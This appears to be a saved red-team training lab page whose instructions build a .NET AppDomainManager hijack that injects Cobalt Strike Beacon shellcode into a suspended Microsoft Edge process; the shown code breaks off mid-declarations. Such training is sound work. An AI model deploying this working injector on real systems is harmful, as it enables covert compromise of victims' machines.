@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<!-- saved from url=(0083)https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a -->
+<html lang="en-US" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Initial Access Lab</title>
+    <link rel="shortcut icon" href="https://labclient.labondemand.com/images/favicon-32x32.png">
+    <script async="" src="./datadog-logs.js"></script><script src="./jquery(1).min.js"></script>
+    <script src="./jquery-ui(1).min.js"></script>
+    <script src="./showdown.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="./prettify.css">
+    <script src="./yaml.min.js"></script>
+    <script src="./jquery.timepicker.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="./jquery.timepicker.css">
+    <script src="./html-sanitizer.js"></script>
+    <script src="./LocalizeTo(1)" type="text/javascript"></script>
+    <script src="./string-functions.js"></script>
+    <script src="./notifications-v2.js"></script>
+    <script src="./LocalizeTo(2)" type="text/javascript"></script>
+    <script src="./mentor-bubble.js"></script>
+    <link href="./jquery-ui.css" rel="stylesheet">
+    <link href="./lab-client-layout-v2.css" rel="stylesheet" type="text/css">
+    <link href="./mentor-bubble.css" rel="stylesheet" type="text/css">
+    <link id="themeStylesheet" href="./styles-v2" rel="stylesheet" type="text/css">
+
+
+    <script src="./lab-client-api.js"></script>
+        <script>
+            function initializeThemeScript() {
+                
+// Theme - Primary
+
+/*
+ * Skillable Theme JS: add a support email line to the lab client Help dialog
+ * Paste into the Theme's JavaScript field and assign the theme to the lab profile.
+ *
+ * Config:
+ *   SUPPORT_EMAIL        - address shown in the dialog (opens as a mailto link)
+ *   HIDE_DEFAULT_OPTIONS - true hides the default "Help" and "Report a bug" links
+ */
+(function () {
+    var SUPPORT_EMAIL = 'support.zeropoint@fortra.com';
+    var HIDE_DEFAULT_OPTIONS = false;
+    var MARKER = 'data-custom-support-email';
+
+    // Find the "Other Help Options" heading by its text (no stable class/ID on this dialog)
+    function findHeading() {
+        var nodes = document.querySelectorAll('h1, h2, h3, h4, h5, h6, div, span, p');
+        for (var i = 0; i < nodes.length; i++) {
+            var el = nodes[i];
+            if (el.children.length === 0 && el.textContent.trim() === 'Other Help Options') {
+                return el;
+            }
+        }
+        return null;
+    }
+
+    function hideDefaultLinks(scope) {
+        var links = scope.querySelectorAll('a');
+        for (var i = 0; i < links.length; i++) {
+            var t = links[i].textContent.trim();
+            if (t === 'Help' || t === 'Report a bug') {
+                // Hide the link's row (icon + text)
+                (links[i].parentElement || links[i]).style.display = 'none';
+            }
+        }
+    }
+
+    function inject() {
+        var heading = findHeading();
+        if (!heading) return;
+
+        var section = heading.parentElement || heading;
+        if (section.querySelector('[' + MARKER + ']')) return; // already added
+
+        // Match the colour of the existing dialog links
+        var existingLink = section.querySelector('a');
+        var linkColour = existingLink ? getComputedStyle(existingLink).color : 'inherit';
+
+        var block = document.createElement('div');
+        block.setAttribute(MARKER, 'true');
+        block.style.cssText = 'margin:8px 0 12px 0;font-size:14px;line-height:1.5;';
+        block.innerHTML =
+            'Having trouble? Email ' +
+            '<a href="mailto:' + SUPPORT_EMAIL + '" target="_blank" rel="noopener" ' +
+            'style="color:' + linkColour + ';text-decoration:underline;">' +
+            SUPPORT_EMAIL + '</a>' +
+            ' with your Lab ID and a short description of the issue.';
+
+        heading.insertAdjacentElement('afterend', block);
+
+        if (HIDE_DEFAULT_OPTIONS) hideDefaultLinks(section);
+    }
+
+    // The Help dialog is rendered on demand, so watch for it appearing
+    var observer = new MutationObserver(function () { inject(); });
+    observer.observe(document.body, { childList: true, subtree: true });
+
+    inject();
+})();
+
+            }
+        </script>
+</head>
+<body class="instructions-client childClient integrated-layout" style="font-size: 100%;">
+    <div id="labClient" style="">
+        <div class="lab-client-header" role="banner">
+
+            <div class="header-left">
+                <div class="theme-logo"></div>
+                <div id="labName" class="lab-name" role="heading" aria-level="1">
+                    <span id="instanceName" title="Initial Access Lab">Initial Access Lab</span>
+                </div>
+            </div>
+
+                    <a href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" id="exitMenuButton" class="exit-button icon-link" role="button" aria-label="Exit Lab" aria-expanded="false" title="Menu with options for exiting the lab, including saving and ending the lab.">Exit Lab</a>
+                <div id="exitMenu" class="menu" role="menu" aria-label="Exit Menu" aria-haspopup="true" aria-expanded="false">
+                        <div id="saveAndExit" class="menu-item save-button icon-link" tabindex="0" role="menuitem" aria-label="Save Progress And Exit">Save Progress And Exit</div>
+                        <div id="exit" class="menu-item cancel-button icon-link" tabindex="0" role="menuitem" aria-label="End Lab">End Lab</div>
+                </div>
+        </div>
+
+        <div class="tab-headings primary-color-low-opacity-border" role="navigation">
+            <div id="tabHolder" class="tab-holder" role="tablist">
+                    <a tabindex="0" class="tabHeading tab-heading primary-color-border selected" aria-selected="true" role="tab" aria-posinset="1" aria-setsize="2" aria-label="Instructions" data-target="instructionsTab" data-id="0">Instructions</a>
+                    <a tabindex="0" class="tabHeading tab-heading primary-color-border " aria-selected="false" role="tab" aria-posinset="2" aria-setsize="2" aria-label="Resources" data-target="resourcesTab" data-id="1">Resources</a>
+            </div>
+            <div class="icon-holder">
+                <a tabindex="0" id="notificationsButton" data-target="notifications-menu" class="notifications-button modal-menu-button icon primary-color-icon " role="button" aria-label="Notifications" title="Notifications"></a>
+                <a tabindex="0" data-target="settings-menu" class="settings-button modal-menu-button icon primary-color-icon" role="button" aria-label="Settings" title="Settings"></a>
+            </div>
+        </div>
+
+        <div class="tabs" role="main">
+            <div id="instructionsTab" class="tab selected">
+                <div id="instructionsContent" class="tab-content withFooter instructions withTaskProgress withNavigation" aria-label="Lab Instructions">
+                    <div id="pages"><div class="page" id="page0"><include src="https://raw.githubusercontent.com/ZeroPointSecurity/LabContent/refs/heads/main/header.md" data-name="">
+<p></p><center><p></p>
+<h1 class="lab-title primary-color">Initial Access Lab</h1>
+<p></p></center><p></p></include>
+<h1 id="introduction">Introduction</h1>
+<p>Hello TEBBAA ADNANE.</p>
+<p>The objective for this lab is to create an initial access package that will spawn and inject Beacon shellcode into Microsoft Edge.</p>
+<p>Log into <a href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" class="selectMachineLink icon-link special-action-link" data-data="351850">Attacker Desktop</a> with the password <span class="typeText" title="Type Text" tabindex="0" role="button">Passw0rd!</span>.</p>
+</div><div class="page" id="page1">
+<h1 id="payload">Payload</h1>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex0"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex0"><span></span></label> Launch Cobalt Strike and connect to the team server.</p></li>
+<li class="task-list-item" id="taskIndex1"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex1"><span></span></label> Generate Beacon shellcode.</p>
+<ol>
+<li>Go to <strong>Payloads &gt; Windows Stageless Payload</strong>.</li>
+<li>Listener: <strong>http</strong></li>
+<li>Output: <strong>Raw</strong></li>
+<li>Click <strong>Generate</strong>.</li>
+<li>Save to <em>C:\Payloads\http_x64.xprocess.bin</em>.</li></ol></li>
+<li class="task-list-item" id="taskIndex2"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex2"><span></span></label> Open a Terminal window and create a new directory to hold the dependencies for the infection chain.</p>
+<ol>
+<li><span class="typeText" title="Type Text" tabindex="0" role="button">mkdir C:\Payloads\deals</span></li></ol></li>
+<li class="task-list-item" id="taskIndex3"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex3"><span></span></label> Open Visual Studio from the Windows taskbar.</p>
+<p>
+<img src="./visual-studio.png" alt="visual-studio.png"></p></li>
+<li class="task-list-item" id="taskIndex4"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex4"><span></span></label> Click 'Create a new project'</p></li>
+<li class="task-list-item" id="taskIndex5"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex5"><span></span></label> Choose the <strong>Class Library (.NET Framework)</strong> template.</p>
+<blockquote class="alert" role="alert">
+  <p>Make sure it specifically says <strong>.NET Framework</strong>, otherwise it won't work.
+  
+  <img src="./dotnet-framework.png" alt="dotnet-framework.png"></p>
+</blockquote></li>
+<li class="task-list-item" id="taskIndex6"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex6"><span></span></label> Configure the project:</p>
+<ol>
+<li>Project name: <span class="typeText" title="Type Text" tabindex="0" role="button">AppDomainHijack</span>.</li>
+<li>Check the <em>place solution and project in the same directory</em> box.</li></ol></li>
+<li class="task-list-item" id="taskIndex7"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex7"><span></span></label> Add the shellcode to the project.</p>
+<ol>
+<li>Right-click the project in the Solution Explorer and select <strong>Add &gt; Existing Item</strong>.</li>
+<li>Browse to <em>C:\Payloads</em>.</li>
+<li>Change the file filter to <em>All Files</em>.</li>
+<li>Select <em>http_x64.xprocess.bin</em> and click <strong>Add</strong>.</li>
+<li>Right-click the shellcode file in the Solution Explorer and select <strong>Properties</strong>.</li>
+<li>Set its <em>Build Action</em> to <strong>Embedded Resource</strong>.</li></ol></li>
+<li class="task-list-item" id="taskIndex8"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex8"><span></span></label> Copy the following code into Class1.cs:</p>
+<pre><div class="codeTitle"><span class="title">csharp</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="csharp-linenums language-csharp-linenums prettyprint prettyprinted" tabindex="0" style=""><ol class="linenums"><li class="L0"><span class="kwd">using</span><span class="pln"> </span><span class="typ">System</span><span class="pun">;</span>
+</li><li class="L1"><span class="kwd">using</span><span class="pln"> </span><span class="typ">System</span><span class="pun">.</span><span class="pln">IO</span><span class="pun">;</span>
+</li><li class="L2"><span class="kwd">using</span><span class="pln"> </span><span class="typ">System</span><span class="pun">.</span><span class="typ">Reflection</span><span class="pun">;</span>
+</li><li class="L3"><span class="kwd">using</span><span class="pln"> </span><span class="typ">System</span><span class="pun">.</span><span class="typ">Runtime</span><span class="pun">.</span><span class="typ">InteropServices</span><span class="pun">;</span>
+</li><li class="L4"><span class="pln">&nbsp;</span>
+</li><li class="L5"><span class="kwd">namespace</span><span class="pln"> </span><span class="typ">AppDomainHijack</span>
+</li><li class="L6"><span class="pun">{</span>
+</li><li class="L7"><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">sealed</span><span class="pln"> </span><span class="kwd">class</span><span class="pln"> </span><span class="typ">DomainManager</span><span class="pln"> </span><span class="pun">:</span><span class="pln"> </span><span class="typ">AppDomainManager</span>
+</li><li class="L8"><span class="pln">    </span><span class="pun">{</span>
+</li><li class="L9"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">override</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> </span><span class="typ">InitializeNewDomain</span><span class="pun">(</span><span class="typ">AppDomainSetup</span><span class="pln"> appDomainInfo</span><span class="pun">)</span>
+</li><li class="L0"><span class="pln">        </span><span class="pun">{</span>
+</li><li class="L1"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> si </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> STARTUPINFOA</span>
+</li><li class="L2"><span class="pln">            </span><span class="pun">{</span>
+</li><li class="L3"><span class="pln">                cb </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">uint</span><span class="pun">)</span><span class="typ">Marshal</span><span class="pun">.</span><span class="typ">SizeOf</span><span class="pun">&lt;</span><span class="pln">STARTUPINFOA</span><span class="pun">&gt;(),</span>
+</li><li class="L4"><span class="pln">                dwFlags </span><span class="pun">=</span><span class="pln"> STARTUPINFO_FLAGS</span><span class="pun">.</span><span class="pln">STARTF_USESHOWWINDOW</span>
+</li><li class="L5"><span class="pln">            </span><span class="pun">};</span>
+</li><li class="L6"><span class="pln">&nbsp;</span>
+</li><li class="L7"><span class="pln">            </span><span class="com">// create hidden + suspended msedge process</span>
+</li><li class="L8"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> success </span><span class="pun">=</span><span class="pln"> </span><span class="typ">CreateProcessA</span><span class="pun">(</span>
+</li><li class="L9"><span class="pln">                </span><span class="str">"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">                </span><span class="str">"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window"</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">                </span><span class="typ">IntPtr</span><span class="pun">.</span><span class="typ">Zero</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">                </span><span class="typ">IntPtr</span><span class="pun">.</span><span class="typ">Zero</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">                </span><span class="kwd">false</span><span class="pun">,</span>
+</li><li class="L4"><span class="pln">                PROCESS_CREATION_FLAGS</span><span class="pun">.</span><span class="pln">CREATE_NO_WINDOW </span><span class="pun">|</span><span class="pln"> PROCESS_CREATION_FLAGS</span><span class="pun">.</span><span class="pln">CREATE_SUSPENDED</span><span class="pun">,</span>
+</li><li class="L5"><span class="pln">                </span><span class="typ">IntPtr</span><span class="pun">.</span><span class="typ">Zero</span><span class="pun">,</span>
+</li><li class="L6"><span class="pln">                </span><span class="str">"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\"</span><span class="pun">,</span>
+</li><li class="L7"><span class="pln">                </span><span class="kwd">ref</span><span class="pln"> si</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">                </span><span class="kwd">out</span><span class="pln"> </span><span class="kwd">var</span><span class="pln"> pi</span><span class="pun">);</span>
+</li><li class="L9"><span class="pln">&nbsp;</span>
+</li><li class="L0"><span class="pln">            </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(!</span><span class="pln">success</span><span class="pun">)</span>
+</li><li class="L1"><span class="pln">                </span><span class="kwd">return</span><span class="pun">;</span>
+</li><li class="L2"><span class="pln">&nbsp;</span>
+</li><li class="L3"><span class="pln">            </span><span class="com">// get basic process information</span>
+</li><li class="L4"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> szPbi </span><span class="pun">=</span><span class="pln"> </span><span class="typ">Marshal</span><span class="pun">.</span><span class="typ">SizeOf</span><span class="pun">&lt;</span><span class="pln">PROCESS_BASIC_INFORMATION</span><span class="pun">&gt;();</span>
+</li><li class="L5"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> lpPbi </span><span class="pun">=</span><span class="pln"> </span><span class="typ">Marshal</span><span class="pun">.</span><span class="typ">AllocHGlobal</span><span class="pun">(</span><span class="pln">szPbi</span><span class="pun">);</span>
+</li><li class="L6"><span class="pln">&nbsp;</span>
+</li><li class="L7"><span class="pln">            </span><span class="typ">NtQueryInformationProcess</span><span class="pun">(</span>
+</li><li class="L8"><span class="pln">                pi</span><span class="pun">.</span><span class="pln">hProcess</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">                PROCESSINFOCLASS</span><span class="pun">.</span><span class="typ">ProcessBasicInformation</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">                lpPbi</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">                </span><span class="pun">(</span><span class="kwd">uint</span><span class="pun">)</span><span class="pln">szPbi</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">                </span><span class="kwd">out</span><span class="pln"> _</span><span class="pun">);</span>
+</li><li class="L3"><span class="pln">&nbsp;</span>
+</li><li class="L4"><span class="pln">            </span><span class="com">// marshal data to structure</span>
+</li><li class="L5"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> pbi </span><span class="pun">=</span><span class="pln"> </span><span class="typ">Marshal</span><span class="pun">.</span><span class="typ">PtrToStructure</span><span class="pun">&lt;</span><span class="pln">PROCESS_BASIC_INFORMATION</span><span class="pun">&gt;(</span><span class="pln">lpPbi</span><span class="pun">);</span>
+</li><li class="L6"><span class="pln">            </span><span class="typ">Marshal</span><span class="pun">.</span><span class="typ">FreeHGlobal</span><span class="pun">(</span><span class="pln">lpPbi</span><span class="pun">);</span>
+</li><li class="L7"><span class="pln">&nbsp;</span>
+</li><li class="L8"><span class="pln">            </span><span class="com">// calculate pointer to image base address</span>
+</li><li class="L9"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> lpImageBaseAddress </span><span class="pun">=</span><span class="pln"> pbi</span><span class="pun">.</span><span class="typ">PebBaseAddress</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> </span><span class="lit">0x10</span><span class="pun">;</span>
+</li><li class="L0"><span class="pln">&nbsp;</span>
+</li><li class="L1"><span class="pln">            </span><span class="com">// buffer to hold data, 64-bit addresses are 8 bytes</span>
+</li><li class="L2"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> bImageBaseAddress </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="kwd">byte</span><span class="pun">[</span><span class="lit">8</span><span class="pun">];</span>
+</li><li class="L3"><span class="pln">&nbsp;</span>
+</li><li class="L4"><span class="pln">            </span><span class="com">// read data from spawned process</span>
+</li><li class="L5"><span class="pln">            </span><span class="typ">ReadProcessMemory</span><span class="pun">(</span>
+</li><li class="L6"><span class="pln">                pi</span><span class="pun">.</span><span class="pln">hProcess</span><span class="pun">,</span>
+</li><li class="L7"><span class="pln">                lpImageBaseAddress</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">                bImageBaseAddress</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">                </span><span class="lit">8</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">                </span><span class="kwd">out</span><span class="pln"> _</span><span class="pun">);</span>
+</li><li class="L1"><span class="pln">&nbsp;</span>
+</li><li class="L2"><span class="pln">            </span><span class="com">// convert address bytes to pointer</span>
+</li><li class="L3"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> baseAddress </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="typ">IntPtr</span><span class="pun">)</span><span class="typ">BitConverter</span><span class="pun">.</span><span class="typ">ToInt64</span><span class="pun">(</span><span class="pln">bImageBaseAddress</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">);</span>
+</li><li class="L4"><span class="pln">&nbsp;</span>
+</li><li class="L5"><span class="pln">            </span><span class="com">// read pe headers</span>
+</li><li class="L6"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> data </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="kwd">byte</span><span class="pun">[</span><span class="lit">512</span><span class="pun">];</span>
+</li><li class="L7"><span class="pln">&nbsp;</span>
+</li><li class="L8"><span class="pln">            </span><span class="typ">ReadProcessMemory</span><span class="pun">(</span>
+</li><li class="L9"><span class="pln">                pi</span><span class="pun">.</span><span class="pln">hProcess</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">                baseAddress</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">                data</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">                </span><span class="lit">512</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">                </span><span class="kwd">out</span><span class="pln"> _</span><span class="pun">);</span>
+</li><li class="L4"><span class="pln">&nbsp;</span>
+</li><li class="L5"><span class="pln">            </span><span class="com">// read e_lfanew</span>
+</li><li class="L6"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> e_lfanew </span><span class="pun">=</span><span class="pln"> </span><span class="typ">BitConverter</span><span class="pun">.</span><span class="typ">ToInt32</span><span class="pun">(</span><span class="pln">data</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x3C</span><span class="pun">);</span>
+</li><li class="L7"><span class="pln">&nbsp;</span>
+</li><li class="L8"><span class="pln">            </span><span class="com">// calculate rva</span>
+</li><li class="L9"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> rvaOffset </span><span class="pun">=</span><span class="pln"> e_lfanew </span><span class="pun">+</span><span class="pln"> </span><span class="lit">0x28</span><span class="pun">;</span>
+</li><li class="L0"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> rva </span><span class="pun">=</span><span class="pln"> </span><span class="typ">BitConverter</span><span class="pun">.</span><span class="typ">ToUInt32</span><span class="pun">(</span><span class="pln">data</span><span class="pun">,</span><span class="pln"> rvaOffset</span><span class="pun">);</span>
+</li><li class="L1"><span class="pln">&nbsp;</span>
+</li><li class="L2"><span class="pln">            </span><span class="com">// calculate address of entry point</span>
+</li><li class="L3"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> lpEntryPoint </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="typ">IntPtr</span><span class="pun">)((</span><span class="typ">UInt64</span><span class="pun">)</span><span class="pln">baseAddress </span><span class="pun">+</span><span class="pln"> rva</span><span class="pun">);</span>
+</li><li class="L4"><span class="pln">&nbsp;</span>
+</li><li class="L5"><span class="pln">            </span><span class="com">// read the shellcode</span>
+</li><li class="L6"><span class="pln">            </span><span class="kwd">byte</span><span class="pun">[]</span><span class="pln"> shellcode</span><span class="pun">;</span>
+</li><li class="L7"><span class="pln">&nbsp;</span>
+</li><li class="L8"><span class="pln">            </span><span class="kwd">var</span><span class="pln"> assembly </span><span class="pun">=</span><span class="pln"> </span><span class="typ">Assembly</span><span class="pun">.</span><span class="typ">GetExecutingAssembly</span><span class="pun">();</span>
+</li><li class="L9"><span class="pln">&nbsp;</span>
+</li><li class="L0"><span class="pln">            </span><span class="kwd">using</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">var</span><span class="pln"> rs </span><span class="pun">=</span><span class="pln"> assembly</span><span class="pun">.</span><span class="typ">GetManifestResourceStream</span><span class="pun">(</span><span class="str">"AppDomainHijack.http_x64.xprocess.bin"</span><span class="pun">))</span>
+</li><li class="L1"><span class="pln">            </span><span class="pun">{</span>
+</li><li class="L2"><span class="pln">                </span><span class="com">// convert stream to raw byte[]</span>
+</li><li class="L3"><span class="pln">                </span><span class="kwd">using</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">var</span><span class="pln"> ms </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">MemoryStream</span><span class="pun">())</span>
+</li><li class="L4"><span class="pln">                </span><span class="pun">{</span>
+</li><li class="L5"><span class="pln">                    rs</span><span class="pun">.</span><span class="typ">CopyTo</span><span class="pun">(</span><span class="pln">ms</span><span class="pun">);</span>
+</li><li class="L6"><span class="pln">                    shellcode </span><span class="pun">=</span><span class="pln"> ms</span><span class="pun">.</span><span class="typ">ToArray</span><span class="pun">();</span>
+</li><li class="L7"><span class="pln">                </span><span class="pun">}</span>
+</li><li class="L8"><span class="pln">            </span><span class="pun">}</span>
+</li><li class="L9"><span class="pln">&nbsp;</span>
+</li><li class="L0"><span class="pln">            </span><span class="com">// copy shellcode into address of entry point</span>
+</li><li class="L1"><span class="pln">            </span><span class="typ">WriteProcessMemory</span><span class="pun">(</span>
+</li><li class="L2"><span class="pln">                pi</span><span class="pun">.</span><span class="pln">hProcess</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">                lpEntryPoint</span><span class="pun">,</span>
+</li><li class="L4"><span class="pln">                shellcode</span><span class="pun">,</span>
+</li><li class="L5"><span class="pln">                shellcode</span><span class="pun">.</span><span class="typ">Length</span><span class="pun">,</span>
+</li><li class="L6"><span class="pln">                </span><span class="kwd">out</span><span class="pln"> _</span><span class="pun">);</span>
+</li><li class="L7"><span class="pln">&nbsp;</span>
+</li><li class="L8"><span class="pln">            </span><span class="com">// resume process</span>
+</li><li class="L9"><span class="pln">            </span><span class="typ">ResumeThread</span><span class="pun">(</span><span class="pln">pi</span><span class="pun">.</span><span class="pln">hThread</span><span class="pun">);</span>
+</li><li class="L0"><span class="pln">        </span><span class="pun">}</span>
+</li><li class="L1"><span class="pln">&nbsp;</span>
+</li><li class="L2"><span class="pln">        </span><span class="pun">[</span><span class="typ">DllImport</span><span class="pun">(</span><span class="str">"KERNEL32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="typ">ExactSpelling</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">,</span><span class="pln"> </span><span class="typ">SetLastError</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">,</span><span class="pln"> </span><span class="typ">CharSet</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="typ">CharSet</span><span class="pun">.</span><span class="typ">Ansi</span><span class="pun">)]</span>
+</li><li class="L3"><span class="pln">        </span><span class="pun">[</span><span class="typ">DefaultDllImportSearchPaths</span><span class="pun">(</span><span class="typ">DllImportSearchPath</span><span class="pun">.</span><span class="typ">System32</span><span class="pun">)]</span>
+</li><li class="L4"><span class="pln">        </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">extern</span><span class="pln"> </span><span class="kwd">bool</span><span class="pln"> </span><span class="typ">CreateProcessA</span><span class="pun">(</span>
+</li><li class="L5"><span class="pln">            </span><span class="kwd">string</span><span class="pln"> applicationName</span><span class="pun">,</span>
+</li><li class="L6"><span class="pln">            </span><span class="kwd">string</span><span class="pln"> commandLine</span><span class="pun">,</span>
+</li><li class="L7"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> processAttributes</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> threadAttributes</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">            </span><span class="kwd">bool</span><span class="pln"> inheritHandles</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">            PROCESS_CREATION_FLAGS creationFlags</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> environment</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">            </span><span class="kwd">string</span><span class="pln"> currentDirectory</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">            </span><span class="kwd">ref</span><span class="pln"> STARTUPINFOA startupInfo</span><span class="pun">,</span>
+</li><li class="L4"><span class="pln">            </span><span class="kwd">out</span><span class="pln"> PROCESS_INFORMATION processInformation</span><span class="pun">);</span>
+</li><li class="L5"><span class="pln">&nbsp;</span>
+</li><li class="L6"><span class="pln">        </span><span class="pun">[</span><span class="typ">DllImport</span><span class="pun">(</span><span class="str">"ntdll.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="typ">ExactSpelling</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">)]</span>
+</li><li class="L7"><span class="pln">        </span><span class="pun">[</span><span class="typ">DefaultDllImportSearchPaths</span><span class="pun">(</span><span class="typ">DllImportSearchPath</span><span class="pun">.</span><span class="typ">System32</span><span class="pun">)]</span>
+</li><li class="L8"><span class="pln">        </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">extern</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> </span><span class="typ">NtQueryInformationProcess</span><span class="pun">(</span>
+</li><li class="L9"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> processHandle</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">            PROCESSINFOCLASS processInformationClass</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> processInformation</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">            </span><span class="kwd">uint</span><span class="pln"> processInformationLength</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">            </span><span class="kwd">out</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> returnLength</span><span class="pun">);</span>
+</li><li class="L4"><span class="pln">&nbsp;</span>
+</li><li class="L5"><span class="pln">        </span><span class="pun">[</span><span class="typ">DllImport</span><span class="pun">(</span><span class="str">"KERNEL32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="typ">ExactSpelling</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">,</span><span class="pln"> </span><span class="typ">SetLastError</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">)]</span>
+</li><li class="L6"><span class="pln">        </span><span class="pun">[</span><span class="typ">DefaultDllImportSearchPaths</span><span class="pun">(</span><span class="typ">DllImportSearchPath</span><span class="pun">.</span><span class="typ">System32</span><span class="pun">)]</span>
+</li><li class="L7"><span class="pln">        </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">extern</span><span class="pln"> </span><span class="kwd">bool</span><span class="pln"> </span><span class="typ">ReadProcessMemory</span><span class="pun">(</span>
+</li><li class="L8"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> processHandle</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> baseAddress</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">            </span><span class="kwd">byte</span><span class="pun">[]</span><span class="pln"> buffer</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">            </span><span class="typ">UInt64</span><span class="pln"> size</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">            </span><span class="kwd">out</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> numberOfBytesRead</span><span class="pun">);</span>
+</li><li class="L3"><span class="pln">&nbsp;</span>
